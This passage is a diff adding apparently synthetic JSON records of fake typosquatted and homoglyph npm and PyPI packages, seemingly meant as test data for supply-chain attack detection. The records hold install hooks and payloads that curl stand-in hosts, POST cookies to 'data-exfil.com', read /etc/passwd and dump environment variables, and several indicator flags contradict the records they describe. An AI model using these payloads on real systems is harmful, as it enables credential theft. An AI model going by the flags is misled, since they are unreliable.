@@ -1,0 +1,2532 @@
+{
+  "scenario": "dependency-confusion",
+  "timestamp": "2025-08-21T20:58:34.366Z",
+  "totalAttacks": 55,
+  "attacksByRegistry": {
+    "npm": 15,
+    "pypi": 13,
+    "maven": 6,
+    "nuget": 8,
+    "rubygems": 13
+  },
+  "attacksByType": {
+    "typosquatting": 20,
+    "homoglyph": 20,
+    "combosquatting": 15
+  },
+  "attacks": [
+    {
+      "id": "a2f9fa36270bba5e",
+      "name": "reactt",
+      "registry": "npm",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "reactt - now with better TypeScript support",
+        "author": "community-maintainer",
+        "homepage": "https://7b45bd27.sourceforge.net",
+        "repository": "https://gitlab.com/d02baa1e/39bca8a9",
+        "keywords": [
+          "reactt",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "1.0.0-alpha.1",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9868173189378943,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "react"
+    },
+    {
+      "id": "2bb50df214c3f840",
+      "name": "lodaash",
+      "registry": "npm",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Unofficial lodaash package with extra utilities",
+        "author": "trusted-contributor",
+        "homepage": "https://dc42df29.bitbucket.org",
+        "repository": "https://github.com/1a2f48b7/364f9cac",
+        "keywords": [
+          "lodaash",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "0.0.1-beta",
+          "data-collector": "2.0.0-rc.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8992301254285429,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "lodash"
+    },
+    {
+      "id": "e3496426e993c82c",
+      "name": "expresss",
+      "registry": "npm",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "expresss - now with better TypeScript support",
+        "author": "core-developer",
+        "homepage": "https://8d65aea3.sourceforge.net",
+        "repository": "https://bitbucket.org/b3c55321/02478091",
+        "keywords": [
+          "expresss",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "2.0.0-rc.1",
+          "data-collector": "0.0.1-beta"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7834244405787973,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "express"
+    },
+    {
+      "id": "b8f955aebb1699d7",
+      "name": "axioss",
+      "registry": "npm",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "axioss - now with better TypeScript support",
+        "author": "community-maintainer",
+        "homepage": "https://47bc991f.bitbucket.org",
+        "repository": "https://github.com/8562837c/c33e982f",
+        "keywords": [
+          "axioss",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "999.999.999",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8706186103183137,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "axios"
+    },
+    {
+      "id": "93bbf46224158775",
+      "name": "momment",
+      "registry": "npm",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Enhanced version of momment with additional features",
+        "author": "core-developer",
+        "homepage": "https://6611bd95.github.io",
+        "repository": "https://bitbucket.org/bda3cec3/0f38fa40",
+        "keywords": [
+          "momment",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "0.0.1-beta",
+          "data-collector": "1.0.0+build.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.86926546953104,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "moment"
+    },
+    {
+      "id": "514e9b54498c899b",
+      "name": "rеact",
+      "registry": "npm",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Unofficial rеact package with extra utilities",
+        "author": "community-maintainer",
+        "homepage": "https://19b075ad.sourceforge.net",
+        "repository": "https://bitbucket.org/ea4ab59f/f88ce39a",
+        "keywords": [
+          "rеact",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "999.999.999",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7839187699686273,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "react"
+    },
+    {
+      "id": "b32ab169201345e9",
+      "name": "lοdash",
+      "registry": "npm",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.364Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "lοdash - now with better TypeScript support",
+        "author": "security-researcher",
+        "homepage": "https://456952e2.gitlab.io",
+        "repository": "https://github.com/bd833cb1/2632f73f",
+        "keywords": [
+          "lοdash",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "2.0.0-rc.1",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8534129993162245,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "lodash"
+    },
+    {
+      "id": "e41a3a360b22e0ce",
+      "name": "еxpress",
+      "registry": "npm",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Unofficial еxpress package with extra utilities",
+        "author": "trusted-contributor",
+        "homepage": "https://2eb9124b.sourceforge.net",
+        "repository": "https://github.com/da578226/868c2017",
+        "keywords": [
+          "еxpress",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "2.0.0-rc.1",
+          "data-collector": "1.0.0+build.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9396367582875715,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "express"
+    },
+    {
+      "id": "929f6a29fb3bdcc0",
+      "name": "аxios",
+      "registry": "npm",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Community fork of аxios with bug fixes",
+        "author": "security-researcher",
+        "homepage": "https://16a339fe.gitlab.io",
+        "repository": "https://github.com/c70e81f7/d1041f4e",
+        "keywords": [
+          "аxios",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "2.0.0-rc.1",
+          "data-collector": "1.0.0+build.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7717338793716992,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "axios"
+    },
+    {
+      "id": "adf2760145b114d5",
+      "name": "mοment",
+      "registry": "npm",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Community fork of mοment with bug fixes",
+        "author": "official-team",
+        "homepage": "https://cbb55731.sourceforge.net",
+        "repository": "https://github.com/ee5928ba/f1329ee6",
+        "keywords": [
+          "mοment",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "1.0.0-alpha.1",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.721339493825616,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "moment"
+    },
+    {
+      "id": "a938389dfe14d5be",
+      "name": "react-utils",
+      "registry": "npm",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Unofficial react-utils package with extra utilities",
+        "author": "community-maintainer",
+        "homepage": "https://35182669.npmjs.com",
+        "repository": "https://gitlab.com/e5a930d7/2a155274",
+        "keywords": [
+          "react",
+          "utils",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "0.0.1-beta",
+          "data-collector": "999.999.999"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.922193119722084,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "react"
+    },
+    {
+      "id": "abe9401ac08e9598",
+      "name": "lodash-extra",
+      "registry": "npm",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "lodash-extra with security patches and performance improvements",
+        "author": "security-researcher",
+        "homepage": "https://67b73042.sourceforge.net",
+        "repository": "https://bitbucket.org/45e975fd/333ef5cf",
+        "keywords": [
+          "lodash",
+          "extra",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "2.0.0-rc.1",
+          "data-collector": "0.0.1-beta"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9976477138369595,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "lodash"
+    },
+    {
+      "id": "9622f85f76f9519f",
+      "name": "express-middleware",
+      "registry": "npm",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Enhanced version of express-middleware with additional features",
+        "author": "trusted-contributor",
+        "homepage": "https://a02d3d8f.sourceforge.net",
+        "repository": "https://gitlab.com/a6bb4660/2188d9d5",
+        "keywords": [
+          "express",
+          "middleware",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "999.999.999",
+          "data-collector": "2.0.0-rc.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8605019014645404,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "express"
+    },
+    {
+      "id": "11efa7be77b7fe99",
+      "name": "axios-client",
+      "registry": "npm",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "axios-client - now with better TypeScript support",
+        "author": "community-maintainer",
+        "homepage": "https://e4f27912.github.io",
+        "repository": "https://gitlab.com/f1cd144c/ef3576fc",
+        "keywords": [
+          "axios",
+          "client",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "0.0.1-beta",
+          "data-collector": "1.0.0-alpha.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9124583041886958,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "axios"
+    },
+    {
+      "id": "c6623a4ba7b6f113",
+      "name": "moment-timezone-fix",
+      "registry": "npm",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Unofficial moment-timezone-fix package with extra utilities",
+        "author": "core-developer",
+        "homepage": "https://e49056e6.github.io",
+        "repository": "https://gitlab.com/84144247/6757f16e",
+        "keywords": [
+          "moment",
+          "timezone",
+          "fix",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-logger": "1.0.0-alpha.1",
+          "data-collector": "1.0.0+build.1"
+        },
+        "main": "index.js",
+        "scripts": {
+          "preinstall": "node -e \"console.log(process.env)\"",
+          "postinstall": "curl -s http://malicious-server.com/installed"
+        }
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7582747944300355,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "moment"
+    },
+    {
+      "id": "54b89bfb3ffbcd5b",
+      "name": "reqeusts",
+      "registry": "pypi",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "reqeusts - now with better TypeScript support",
+        "author": "trusted-contributor",
+        "homepage": "https://949fd8fd.npmjs.com",
+        "repository": "https://github.com/e52525a6/f0a5aea0",
+        "keywords": [
+          "reqeusts",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "0.0.1-beta",
+          "data-exfiltrator": "0.0.1-beta"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8955799771026342,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "requests"
+    },
+    {
+      "id": "ffb87f351b352ff5",
+      "name": "numpyy",
+      "registry": "pypi",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Community fork of numpyy with bug fixes",
+        "author": "trusted-contributor",
+        "homepage": "https://14e08bc3.github.io",
+        "repository": "https://github.com/f7279fa2/18497a68",
+        "keywords": [
+          "numpyy",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "1.0.0-alpha.1",
+          "data-exfiltrator": "1.0.0-alpha.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8396080073483593,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "numpy"
+    },
+    {
+      "id": "fed8201f36c87901",
+      "name": "pandass",
+      "registry": "pypi",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Unofficial pandass package with extra utilities",
+        "author": "trusted-contributor",
+        "homepage": "https://416e4cb5.sourceforge.net",
+        "repository": "https://bitbucket.org/f752a9d6/28294433",
+        "keywords": [
+          "pandass",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "999.999.999",
+          "data-exfiltrator": "1.0.0+build.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8185485468199302,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "pandas"
+    },
+    {
+      "id": "eaf71bd19297c2d1",
+      "name": "flaskk",
+      "registry": "pypi",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "flaskk - now with better TypeScript support",
+        "author": "security-researcher",
+        "homepage": "https://bded325e.sourceforge.net",
+        "repository": "https://github.com/01f9c4bf/22152022",
+        "keywords": [
+          "flaskk",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "1.0.0+build.1",
+          "data-exfiltrator": "999.999.999"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8658087949734788,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "flask"
+    },
+    {
+      "id": "d0c5fd173e07cd97",
+      "name": "djangoo",
+      "registry": "pypi",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "djangoo with security patches and performance improvements",
+        "author": "trusted-contributor",
+        "homepage": "https://e44e06f0.gitlab.io",
+        "repository": "https://bitbucket.org/2cd5a7db/ab11329f",
+        "keywords": [
+          "djangoo",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "2.0.0-rc.1",
+          "data-exfiltrator": "2.0.0-rc.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9059872202029616,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "django"
+    },
+    {
+      "id": "061d097713fb22bb",
+      "name": "rеquests",
+      "registry": "pypi",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "rеquests with security patches and performance improvements",
+        "author": "core-developer",
+        "homepage": "https://2b539ce5.bitbucket.org",
+        "repository": "https://bitbucket.org/b0a51cbc/271715c6",
+        "keywords": [
+          "rеquests",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "2.0.0-rc.1",
+          "data-exfiltrator": "1.0.0-alpha.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8882663593231359,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "requests"
+    },
+    {
+      "id": "67f193de6c125f6a",
+      "name": "numрy",
+      "registry": "pypi",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Enhanced version of numрy with additional features",
+        "author": "core-developer",
+        "homepage": "https://ccca5729.github.io",
+        "repository": "https://github.com/54535a54/7710c682",
+        "keywords": [
+          "numрy",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "0.0.1-beta",
+          "data-exfiltrator": "2.0.0-rc.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8931348126502798,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "numpy"
+    },
+    {
+      "id": "15f3620038fbbc7c",
+      "name": "рandas",
+      "registry": "pypi",
